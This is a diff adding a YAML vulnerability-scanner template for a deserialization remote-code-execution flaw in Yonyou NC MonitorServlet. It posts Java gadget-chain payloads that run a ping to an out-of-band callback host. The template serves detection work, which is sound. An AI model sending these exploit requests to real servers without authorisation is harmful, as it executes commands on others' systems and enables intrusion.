@@ -1,0 +1,36 @@
+id: yonyou-nc-monitorservlet-rce
+
+info:
+  name: Yonyou NC MonitorServlet Deserialization RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou NC MonitorServlet is vulnerable to deserialization leading to Remote Code Execution (RCE), allowing attackers to execute arbitrary commands on the server.
+  tags: rce, deserialization
+
+http:
+  - raw:
+      - |
+        POST /service/monitorservlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{generate_java_gadget("commons-collections3.1", "ping -c 1 {{interactsh-url}}", "hex")}}
+      - |
+        POST /service/monitorservlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{generate_java_gadget("commons-collections4.0", "ping -c 1 {{interactsh-url}}", "hex")}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "ping"
+          - "monitorservlet"
